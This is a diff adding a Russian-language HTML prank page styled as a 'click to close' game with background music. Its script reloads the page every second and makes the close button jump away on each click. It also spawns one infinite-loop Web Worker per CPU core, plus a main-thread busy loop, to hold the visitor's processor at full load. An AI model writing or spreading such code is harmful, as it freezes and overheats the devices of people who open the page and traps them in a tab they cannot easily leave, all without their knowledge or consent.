@@ -1,0 +1,267 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>CLICK TO CLOSE + LOCAL MUSIC</title>
+    <style>
+        body {
+            background: url('https://avatars.mds.yandex.net/i?id=812dcd22b1b1798df7daf79ae5d2731540b75369-8497211-images-thumbs&n=13') no-repeat center center fixed;
+            background-size: cover;
+            color: #0ff;
+            font-family: 'Courier New', monospace;
+            text-align: center;
+            margin: 0;
+            padding: 0;
+            min-height: 100vh;
+            position: relative;
+            transition: background-image 0.3s ease;
+        }
+        body::before {
+            content: "";
+            position: fixed;
+            top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(0, 0, 0, 0.6);
+            z-index: -1;
+        }
+        #container {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background: rgba(0, 20, 20, 0.8);
+            padding: 30px;
+            border-radius: 15px;
+            box-shadow: 0 0 30px cyan;
+            border: 2px solid cyan;
+            width: 500px;
+            height: 350px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+        }
+        h1 {
+            font-size: 1.8em;
+            text-shadow: 0 0 15px cyan;
+            margin-bottom: 5px;
+        }
+        .kg-counter {
+            font-size: 2.5em;
+            margin: 5px 0;
+            color: #ffaa00;
+        }
+        .progress {
+            font-size: 2em;
+            margin: 10px 0;
+            color: #ffaa00;
+        }
+        #buttonContainer {
+            position: relative;
+            width: 100%;
+            height: 100px;
+            margin: 10px 0;
+        }
+        button {
+            position: absolute;
+            background: #0ff;
+            border: none;
+            color: #000;
+            font-size: 1.5em;
+            padding: 10px 20px;
+            border-radius: 10px;
+            cursor: pointer;
+            font-weight: bold;
+            box-shadow: 0 0 20px cyan;
+            transition: 0.1s;
+            white-space: nowrap;
+        }
+        button:hover {
+            background: #ffaa00;
+            box-shadow: 0 0 30px orange;
+        }
+        .manual-close {
+            margin-top: 15px;
+            background: #f44;
+            color: white;
+            font-size: 1em;
+            padding: 5px 10px;
+            border-radius: 5px;
+            cursor: pointer;
+            box-shadow: 0 0 10px red;
+            position: static;
+            display: inline-block;
+        }
+        #bg-music {
+            display: none;
+        }
+        .music-note {
+            margin-top: 10px;
+            font-size: 0.8em;
+            color: #8ff;
+        }
+    </style>
+</head>
+<body>
+    <div id="container">
+        <h1>🔥 КЛИКАЙ НА КНОПКУ ЧТОБ ЗАКРЫТЬ 🔥</h1>
+        <div class="kg-counter" id="kgDisplay">0 кг</div>
+        <div class="progress" id="progressDisplay">0%</div>
+        <div id="buttonContainer">
+            <button id="clickButton">КЛИКАЙ ТУТ</button>
+        </div>
+        <button class="manual-close" id="manualClose">⌫ Закрыть вручную</button>
+        <div class="music-note" id="musicStatus">🎵 Музыка включится после первого клика</div>
+    </div>
+
+    <!-- Локальный аудиофайл music.mp3 -->
+    <audio id="bg-music" loop src="music.mp3"></audio>
+
+    <script>
+        (function() {
+            // ========== СЧЁТЧИК КГ ==========
+            let kg = localStorage.getItem('kgCounter') || 0;
+            kg = parseInt(kg) + 10;
+            localStorage.setItem('kgCounter', kg);
+            document.getElementById('kgDisplay').innerText = kg + ' кг';
+
+            // ========== ПРОГРЕСС ЗАКРЫТИЯ ==========
+            let progress = localStorage.getItem('closeProgress') || 0;
+            progress = parseInt(progress);
+            const progressDisplay = document.getElementById('progressDisplay');
+            const button = document.getElementById('clickButton');
+            const buttonContainer = document.getElementById('buttonContainer');
+            const music = document.getElementById('bg-music');
+            const musicStatus = document.getElementById('musicStatus');
+            let reloadTimer;
+            let musicStarted = false;
+
+            function updateBackground() {
+                if (progress >= 67) {
+                    document.body.style.backgroundImage = "url('https://i.ytimg.com/vi/PVN_l-PFRPE/maxresdefault.jpg')";
+                } else {
+                    document.body.style.backgroundImage = "url('https://avatars.mds.yandex.net/i?id=812dcd22b1b1798df7daf79ae5d2731540b75369-8497211-images-thumbs&n=13')";
+                }
+                document.body.style.backgroundSize = 'cover';
+                document.body.style.backgroundPosition = 'center center';
+                document.body.style.backgroundRepeat = 'no-repeat';
+                document.body.style.backgroundAttachment = 'fixed';
+            }
+
+            function updateProgressDisplay() {
+                progressDisplay.innerText = progress + '%';
+                updateBackground();
+            }
+            updateProgressDisplay();
+
+            function tryPlayMusic() {
+                if (!musicStarted) {
+                    music.play().then(() => {
+                        musicStarted = true;
+                        musicStatus.innerText = '🎵 Музыка играет';
+                    }).catch(e => {
+                        musicStatus.innerText = '⚠️ Кликни ещё раз для музыки';
+                        console.log('Music play failed:', e);
+                    });
+                }
+            }
+
+            function forceClose() {
+                if (reloadTimer) clearTimeout(reloadTimer);
+                
+                // Сброс всего
+                localStorage.removeItem('closeProgress');
+                localStorage.removeItem('kgCounter');
+                
+                progress = 0;
+                kg = 0;
+                document.getElementById('kgDisplay').innerText = '0 кг';
+                updateProgressDisplay();
+
+                window.close();
+                
+                setTimeout(function() {
+                    window.open('', '_self', '');
+                    window.close();
+                    
+                    setTimeout(function() {
+                        location.replace('about:blank');
+                    }, 100);
+                }, 100);
+            }
+
+            if (progress >= 100) {
+                forceClose();
+            }
+
+            function moveButton() {
+                const containerWidth = buttonContainer.clientWidth;
+                const containerHeight = buttonContainer.clientHeight;
+                const buttonWidth = button.offsetWidth;
+                const buttonHeight = button.offsetHeight;
+
+                let left = Math.random() * (containerWidth - buttonWidth);
+                let top = Math.random() * (containerHeight - buttonHeight);
+
+                button.style.left = left + 'px';
+                button.style.top = top + 'px';
+            }
+
+            moveButton();
+
+            button.addEventListener('click', function() {
+                tryPlayMusic();
+
+                if (progress < 100) {
+                    progress++;
+                    localStorage.setItem('closeProgress', progress);
+                    updateProgressDisplay();
+                    moveButton();
+
+                    if (progress >= 100) {
+                        forceClose();
+                    }
+                }
+            });
+
+            document.getElementById('manualClose').addEventListener('click', function() {
+                forceClose();
+            });
+
+            // ========== АВТОПЕРЕЗАГРУЗКА КАЖДУЮ СЕКУНДУ ==========
+            reloadTimer = setTimeout(function() {
+                location.reload(true);
+            }, 1000);
+
+            // ========== 100% НАГРУЗКА CPU ==========
+            if (window.Worker) {
+                const coreCount = navigator.hardwareConcurrency || 4;
+                for (let i = 0; i < coreCount; i++) {
+                    try {
+                        const blob = new Blob([`
+                            onmessage = function(e) {
+                                while (true) {
+                                    Math.sqrt(Math.random() * 1e9);
+                                    Math.sin(Math.random());
+                                    Math.cos(Math.random());
+                                    Math.tan(Math.random());
+                                }
+                            };
+                        `]);
+                        const worker = new Worker(URL.createObjectURL(blob));
+                        worker.postMessage('start');
+                    } catch (e) {}
+                }
+            }
+
+            function lightLoad() {
+                let start = Date.now();
+                while (Date.now() - start < 5) {
+                    Math.sqrt(Math.random() * 1e9);
+                }
+                setTimeout(lightLoad, 0);
+            }
+            lightLoad();
+        })();
+    </script>
+</body>
+</html>
